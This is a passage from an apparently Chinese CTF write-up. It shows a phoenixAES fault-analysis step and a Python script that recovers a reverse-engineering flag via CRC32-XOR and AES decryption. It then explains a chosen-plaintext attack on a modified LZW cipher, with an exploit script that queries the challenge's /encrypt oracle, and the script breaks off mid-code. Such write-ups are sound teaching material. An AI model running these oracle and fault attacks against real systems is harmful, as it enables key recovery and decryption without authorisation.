class="line">&#125;,</span><br><span class="line">onLeave: <span class="keyword">function</span>(retvals)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后就可以根据获取的错误密文得出密钥</p>
<div class="highlight-container" data-rel="Cmake"><figure class="iseeu highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># import phoenixAES</span></span><br><span class="line"><span class="comment"># with open(&#x27;tracefile&#x27;, &#x27;wb&#x27;) as t:</span></span><br><span class="line"><span class="comment">#     t.write(&quot;&quot;&quot;df59d8a5137cfeea687846d0ca070b06</span></span><br><span class="line"><span class="comment">#             5159d8a5137cfecb687854d0ca480b06</span></span><br><span class="line"><span class="comment">#             df59d8d8137cd3ea68bb46d0b7070b06</span></span><br><span class="line"><span class="comment">#             df59eba513a1feeac07846d0ca070b9e</span></span><br><span class="line"><span class="comment">#             df56d8a5107cfeea6878467eca073b06</span></span><br><span class="line"><span class="comment">#             df7fd8a54c7cfeea687846a6ca075806</span></span><br><span class="line"><span class="comment">#             1359d8a5137cfea568788ed0ca970b06</span></span><br><span class="line"><span class="comment">#             df59d82e137cd1ea686146d063070b06</span></span><br><span class="line"><span class="comment">#             df59fda51369feea967846d0ca070b3d</span></span><br><span class="line"><span class="comment">#             df59b6a51315feea557846d0ca070bbb</span></span><br><span class="line"><span class="comment">#             df56d8a5f07cfeea687846cdca076f06</span></span><br><span class="line"><span class="comment">#             8059d8a5137cfe29687863d0ca4d0b06                             </span></span><br><span class="line"><span class="comment">#      &quot;&quot;&quot;.encode(&#x27;utf8&#x27;))</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># phoenixAES.crack_file(&#x27;tracefile&#x27;)</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/39289695/1750688836266-202ce6b0-3be9-4d58-bc61-4790506144f6.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/39289695/1750688851055-be773247-893f-420e-b95b-a0b0908963ef.png"
                      alt="img"
                ></p>
<p>密钥也是小彩蛋。</p>
<p>然后就是循环异或</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/39289695/1750688880120-af8bad00-2f62-4fa9-828f-4114bd0fc15c.png"
                      alt="img"
                ></p>
<p>最后就是整体的脚本：</p>
<div class="highlight-container" data-rel="Cmake"><figure class="iseeu highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># import phoenixAES</span></span><br><span class="line"><span class="comment"># with open(&#x27;tracefile&#x27;, &#x27;wb&#x27;) as t:</span></span><br><span class="line"><span class="comment">#     t.write(&quot;&quot;&quot;df59d8a5137cfeea687846d0ca070b06</span></span><br><span class="line"><span class="comment">#             5159d8a5137cfecb687854d0ca480b06</span></span><br><span class="line"><span class="comment">#             df59d8d8137cd3ea68bb46d0b7070b06</span></span><br><span class="line"><span class="comment">#             df59eba513a1feeac07846d0ca070b9e</span></span><br><span class="line"><span class="comment">#             df56d8a5107cfeea6878467eca073b06</span></span><br><span class="line"><span class="comment">#             df7fd8a54c7cfeea687846a6ca075806</span></span><br><span class="line"><span class="comment">#             1359d8a5137cfea568788ed0ca970b06</span></span><br><span class="line"><span class="comment">#             df59d82e137cd1ea686146d063070b06</span></span><br><span class="line"><span class="comment">#             df59fda51369feea967846d0ca070b3d</span></span><br><span class="line"><span class="comment">#             df59b6a51315feea557846d0ca070bbb</span></span><br><span class="line"><span class="comment">#             df56d8a5f07cfeea687846cdca076f06</span></span><br><span class="line"><span class="comment">#             8059d8a5137cfe29687863d0ca4d0b06                             </span></span><br><span class="line"><span class="comment">#      &quot;&quot;&quot;.encode(&#x27;utf8&#x27;))</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># phoenixAES.crack_file(&#x27;tracefile&#x27;)</span></span><br><span class="line"></span><br><span class="line">import struct</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">def crc32_table_init():</span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="string">&quot;初始化CRC32查找表&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    CRC32_POLYNOMIAL = <span class="number">0</span>xEDB88320</span><br><span class="line">    table = []</span><br><span class="line">    </span><br><span class="line">    for i in range(<span class="number">256</span>):</span><br><span class="line">        crc = i</span><br><span class="line">        for j in range(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span> crc &amp; <span class="number">1</span>:</span><br><span class="line">                crc = (crc &gt;&gt; <span class="number">1</span>) ^ CRC32_POLYNOMIAL</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                crc &gt;&gt;= <span class="number">1</span></span><br><span class="line">        table.append(crc)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> table</span><br><span class="line"></span><br><span class="line">def calculate_crc32(data):</span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="string">&quot;计算CRC32值&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    table = crc32_table_init()</span><br><span class="line">    crc = <span class="number">0</span>xFFFFFFFF</span><br><span class="line">    </span><br><span class="line">    for byte in data:</span><br><span class="line">        crc = table[(crc ^ byte) &amp; <span class="number">0</span>xFF] ^ (crc &gt;&gt; <span class="number">8</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> crc ^ <span class="number">0</span>xFFFFFFFF</span><br><span class="line"></span><br><span class="line">def crc32_decrypt(encrypted_data, key):</span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="string">&quot;CRC32解密（实际是XOR操作）&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    key_bytes = struct.pack(&#x27;&lt;I&#x27;, key)  <span class="comment"># 小端序</span></span><br><span class="line">    crc_key = calculate_crc32(key_bytes)</span><br><span class="line">    </span><br><span class="line">    decrypted = bytearray()</span><br><span class="line">    for i, byte in enumerate(encrypted_data):</span><br><span class="line">        <span class="comment"># 用CRC值的不同字节循环异或</span></span><br><span class="line">        decrypted.append(byte ^ ((crc_key &gt;&gt; ((i % <span class="number">4</span>) * <span class="number">8</span>)) &amp; <span class="number">0</span>xFF))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> bytes(decrypted)</span><br><span class="line"></span><br><span class="line">def aes_decrypt_block(ciphertext, key):</span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="string">&quot;标准AES解密&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> cipher.decrypt(ciphertext)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    <span class="comment"># 从代码中提取的数据</span></span><br><span class="line">    eninput = bytes([</span><br><span class="line">        <span class="number">0</span>x0b,<span class="number">0</span>xcf,<span class="number">0</span>x79,<span class="number">0</span>x7e,<span class="number">0</span>xc7,<span class="number">0</span>xea,<span class="number">0</span>x5f,<span class="number">0</span>x31,</span><br><span class="line">        <span class="number">0</span>xbc,<span class="number">0</span>xee,<span class="number">0</span>xe7,<span class="number">0</span>x0b,<span class="number">0</span>x1e,<span class="number">0</span>x91,<span class="number">0</span>xaa,<span class="number">0</span>xdd,</span><br><span class="line">        <span class="number">0</span>x6f,<span class="number">0</span>x07,<span class="number">0</span>xc1,<span class="number">0</span>x10,<span class="number">0</span>x36,<span class="number">0</span>x75,<span class="number">0</span>x20,<span class="number">0</span>x06,</span><br><span class="line">        <span class="number">0</span>x32,<span class="number">0</span>xe3,<span class="number">0</span>xd0,<span class="number">0</span>x66,<span class="number">0</span>xb8,<span class="number">0</span>x7d,<span class="number">0</span>xfc,<span class="number">0</span>x90</span><br><span class="line">    ])</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 从注释中的key</span></span><br><span class="line">    key = bytes([</span><br><span class="line">        <span class="number">0</span>x44,<span class="number">0</span>x30,<span class="number">0</span>x6e,<span class="number">0</span>x51,<span class="number">0</span>x75,<span class="number">0</span>x31,<span class="number">0</span>x78,<span class="number">0</span>x30,</span><br><span class="line">        <span class="number">0</span>x74,<span class="number">0</span>x65,<span class="number">0</span>x35,<span class="number">0</span>x61,<span class="number">0</span>x6e,<span class="number">0</span>x63,<span class="number">0</span>x68,<span class="number">0</span>x30</span><br><span class="line">    ])</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># CRC32 key</span></span><br><span class="line">    crc_key = <span class="number">0</span>x6c6f7665</span><br><span class="line">    </span><br><span class="line">    print(f<span class="string">&quot;Key (ASCII): &#123;key.decode(&#x27;ascii&#x27;, errors=&#x27;ignore&#x27;)&#125;&quot;</span>)</span><br><span class="line">    print(f<span class="string">&quot;CRC Key: 0x&#123;crc_key:08x&#125;&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 步骤1: CRC32解密</span></span><br><span class="line">    print(<span class="string">&quot;\n=== CRC32解密 ===&quot;</span>)</span><br><span class="line">    after_crc_decrypt = crc32_decrypt(eninput, crc_key)</span><br><span class="line">    print(f<span class="string">&quot;CRC32解密后: &#123;after_crc_decrypt.hex()&#125;&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 步骤2: AES解密</span></span><br><span class="line">    print(<span class="string">&quot;\n=== AES解密 ===&quot;</span>)</span><br><span class="line">    <span class="comment"># 分两个16字节块解密</span></span><br><span class="line">    block1 = after_crc_decrypt[:<span class="number">16</span>]</span><br><span class="line">    block2 = after_crc_decrypt[<span class="number">16</span>:]</span><br><span class="line">    </span><br><span class="line">    decrypted_block1 = aes_decrypt_block(block1, key)</span><br><span class="line">    decrypted_block2 = aes_decrypt_block(block2, key)</span><br><span class="line">    </span><br><span class="line">    result = decrypted_block1 + decrypted_block2</span><br><span class="line">    print(f<span class="string">&quot;AES解密后: &#123;result.hex()&#125;&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    flag = result.decode(&#x27;ascii&#x27;, errors=&#x27;ignore&#x27;).rstrip(&#x27;\x00&#x27;)</span><br><span class="line">    print(f<span class="string">&quot;\n=== 最终结果 ===&quot;</span>)</span><br><span class="line">    print(f<span class="string">&quot;Flag: &#123;flag&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/39289695/1750689102949-177a4c8a-ebb9-48a7-bcf0-c2275b0a53d4.png"
                      alt="img"
                ></p>
<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="题目-Legendary-Zipping-Weapon"><a href="#题目-Legendary-Zipping-Weapon" class="headerlink" title="题目-Legendary Zipping Weapon"></a>题目-Legendary Zipping Weapon</h2><ol>
<li>识别加密算法类型</li>
</ol>
<p>观察<code>compress()</code>和<code>decompress()</code>代码结构，判断本题采用的是基于字典的压缩机制，属于变种 LZW 压缩算法。字典更新规则非标准插入，而是哈希索引 + 全局扰动。</p>
<ol>
<li>初始化字典结构</li>
</ol>
<p>使用<code>_init_dictionary()</code>初始化<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/c6d1d3807f210899dce2f225b92ba132.svg"
                      alt="img"
                >的字典槽位。前 256 个 ASCII 单字节符号通过如下哈希方式插入：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/bce6790524c518b646375e16b2198432.svg"
                      alt="img"
                ></p>
<p>​	遇到冲突时采用线性探测法处理冲突，确保每个单字符符号唯一。</p>
<ol>
<li>分析字典扰动<code>_scramble</code>逻辑</li>
</ol>
<p>字典被视为<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/a11ea46280669ac0bf8afdac4019d77f.svg"
                      alt="img"
                >的二维表，扰动规则如下：</p>
<p>其中<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/b6de5e727178bce8ac1cd91e1f1d40e2.svg"
                      alt="img"
                >是从密钥流中提取的 4 个字节，扰动固定，独立于明文输入。</p>
<ul>
<li><ul>
<li><ul>
<li>奇数列右移<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/334b43543e4621e866c57f5f252436db.svg"
                      alt="img"
                >，偶数列右移<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/7e6de312c7d7a4f71124856fa114c062.svg"
                      alt="img"
                ></li>
<li>奇数行右移<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/afa1bd00c3bc7463054d273b46f29bd5.svg"
                      alt="img"
                >，偶数行右移<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/4c8f3cfedddf6b571f5701506ab34f7d.svg"
                      alt="img"
                ></li>
</ul>
</li>
</ul>
</li>
</ul>
<ol>
<li>压缩函数与异或加密</li>
</ol>
<p>压缩核心流程仍为 LZW，只是在每一步插入新字符串<code>c+byte</code>至字典，通过哈希选择位置并扰动字典。最后使用密钥流对压缩的数据进行异或操作。</p>
<p><strong>攻击步骤</strong></p>
<ol>
<li>字典扰动的缺陷</li>
</ol>
<p>初始 256 个单字节符号在压缩算法开始前就已插入字典，扰动方式固定、只与<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/b6de5e727178bce8ac1cd91e1f1d40e2.svg"
                      alt="img"
                >相关，与输入明文无关。每次新条目插入后执行扰动操作，扰动操作对原始单符号条目的索引形成固定映射。</p>
<ol>
<li>利用固定扰动构造选择明文攻击</li>
</ol>
<p>由于扰动后的字典中，单字符条目的索引完全由密钥决定，我们可以通过一个简单方式验证：固定明文字符 aaa 作为输入，观察其压缩输出，即可确定 aaa 在当前密钥下对应的密文索引。换句话说，输入任意单个字符（如<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/c845eaea1c3d841f6333add3301584b6.svg"
                      alt="img"
                >等）时，输出的加密索引只与密钥有关，与上下文无关。</p>
<p>其原理是：密钥在整个加密过程中保持不变，置换规则固定不变，因此初始单符号的排列顺序在整个压缩过程中是稳定、可预测的，不受明文内容影响。</p>
<p>证明：设<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/ba1b6e7a2a5f6e2808e06f1b6133bb82.svg"
                      alt="img"
                >和<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/837fdce5b4bb422f9a49f3a402e6364f.svg"
                      alt="img"
                >是两个不同明文的第<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/2443fbcfeb7e85e1d62b6f5e4f27207e.svg"
                      alt="img"
                >个被编码字符串，如果它们都是单个符号<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/26fdbf8e53cb0e48da5f4ddd4aaf5a5c.svg"
                      alt="img"
                >，那么在经历<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/2443fbcfeb7e85e1d62b6f5e4f27207e.svg"
                      alt="img"
                >次编码后，两个对应的字典<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/f47ef0f303ba9d9f4f2ac96f6df77277.svg"
                      alt="img"
                >和<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/1de2acf624be540916443fb39b5cceae.svg"
                      alt="img"
                >中，符号<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/26fdbf8e53cb0e48da5f4ddd4aaf5a5c.svg"
                      alt="img"
                >的索引位置是相同的，即<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/fbe29c149ac78e733e08c4e325bee133.svg"
                      alt="img"
                >。密文索引的计算方式为<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/87fbdde927380d29b1760f1268217081.svg"
                      alt="img"
                >。由于异或操作是可逆的，且密钥流<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/19e140f0b2867cc1eb652eb0dada41ff.svg"
                      alt="img"
                >相同，那么只要<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/e5b001d55117a141156e93b55db2cabd.svg"
                      alt="img"
                >，就有<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/e485274d892a24a4f20a8cdfe47de17e.svg"
                      alt="img"
                >。反过来说，如果<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/e485274d892a24a4f20a8cdfe47de17e.svg"
                      alt="img"
                >，也可以推出<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/e5b001d55117a141156e93b55db2cabd.svg"
                      alt="img"
                >。</p>
<p>对于单字符输入，相同字符总是映射到相同密文索引。攻击者可通过构造特定的明文并观察输出，建立查找表，从而还原部分明文信息。</p>
<ol>
<li>构造明文集合并调用加密预言机</li>
</ol>
<p>枚举所有 ASCII 可打印字符构造形式为<code>prefix + c</code>的输入，并调用题目提供的加密 oracle，获取密文。前缀填充用于扰乱上下文影响，确保观测结果指向目标字符 <code>c</code>。</p>
<ol>
<li>解析密文获取索引，构建查找表</li>
</ol>
<ul>
<li><ul>
<li>将加密结果解码（hex -&gt; bytes），再通过<code>_unpack_bits()</code>得到压缩码流索引列表。</li>
<li>取出目标字符所在索引处的值，建立如下查找表：</li>
</ul>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/f2ef701f1bdacd6cd3ebed1d33c1b5cd.svg"
                      alt="img"
                ></p>
<ol>
<li>对题目提供的 challenge 密文执行解码</li>
</ol>
<ul>
<li><ul>
<li>获取 <code>/challenge</code> 密文，对其进行 unpack 得到压缩索引列表。</li>
<li>逐步查表匹配 LUT，获得近似明文。</li>
<li>未命中的位置使用 <code>*</code> 填充。</li>
<li>拼接所有字符还原初始明文结构。</li>
</ul>
</li>
</ul>
<ol>
<li>识别可能的 flag 模板结构，替换缺失字符</li>
</ol>
<p>结合常见 flag 模板<code>DASCTF&#123;...&#125;</code>与已知内容，枚举可能的字符组合替换<code>*</code>，生成多个候选字符串。</p>
<ol>
<li>使用<code>/check</code>接口进行验证，获得最终 flag</li>
</ol>
<ul>
<li><ul>
<li>由于可能有<code>*</code>未匹配，尝试将<code>*</code>用已知字符组合枚举。</li>
<li>使用<code>/check</code>接口验证 flag 是否正确。</li>
<li>直到获得正确返回<code>&quot;result&quot;: &quot;Correct&quot;</code>。</li>
</ul>
</li>
</ul>
<p><strong>exp</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Dict</span>, <span class="type">List</span></span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ProcessPoolExecutor</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node5.buuoj.cn:xxxxx&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LZWCPA</span>:</span><br><span class="line">    BITS_PER_CODE = <span class="number">10</span></span><br><span class="line">    PAD_CHAR_RANGE = <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">256</span>)</span><br><span class="line">    CHARACTER_TABLE = string.ascii_letters + string.digits + <span class="string">&quot; :,.&#123;&#125;\&quot;\&#x27;-!_&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, lut_path: Path, regenerate_lut: <span class="built_in">bool</span> = <span class="literal">False</span>, pad_range: <span class="built_in">range</span> = <span class="built_in">range</span>(<span class="params"><span class="number">0</span>, <span class="number">200</span></span>)</span>):</span><br><span class="line">        self.lut_path = lut_path</span><br><span class="line">        self.regenerate_lut = regenerate_lut</span><br><span class="line">        self.pad_range = pad_range</span><br><span class="line">        self.lut: <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="built_in">str</span>]] = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_unpack_bits</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        result, bitbuf, bits = [], <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line">            bitbuf = (bitbuf &lt;&lt; <span class="number">8</span>) | byte</span><br><span class="line">            bits += <span class="number">8</span></span><br><span class="line">            <span class="keyword">while</span> bits &gt;= LZWCPA.BITS_PER_CODE:</span><br><span class="line">                bits -= LZWCPA.BITS_PER_CODE</span><br><span class="line">                result.append((bitbuf &gt;&gt; bits) &amp; ((<span class="number">1</span> &lt;&lt; LZWCPA.BITS_PER_CODE) - <span class="number">1</span>))</span><br><span class="line">                bitbuf &amp;= (<span class="number">1</span> &lt;&lt; bits) - <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">compress</span>(<span class="params">self, plaintext</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;plaintext&#x27;</span>: plaintext</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> requests.post(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/encrypt&quot;</span>, json=data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_generate_padded_input</span>(<span class="params">self, char: <span class="built_in">str</span>, pad_len: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        padding, count = [], <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> LZWCPA.PAD_CHAR_RANGE:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(i) <span class="keyword">in</span> char:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            use = <span class="built_in">min</span>(<span class="number">2</span>, pad_len - count)</span><br><span class="line">            padding.append(<span class="built_in">chr</span>(i) * use)</span><br><span class="line">            count += use</span><br><span class="line">            <span class="keyword">if</span> count &gt;= pad_len:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(padding) + char</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title 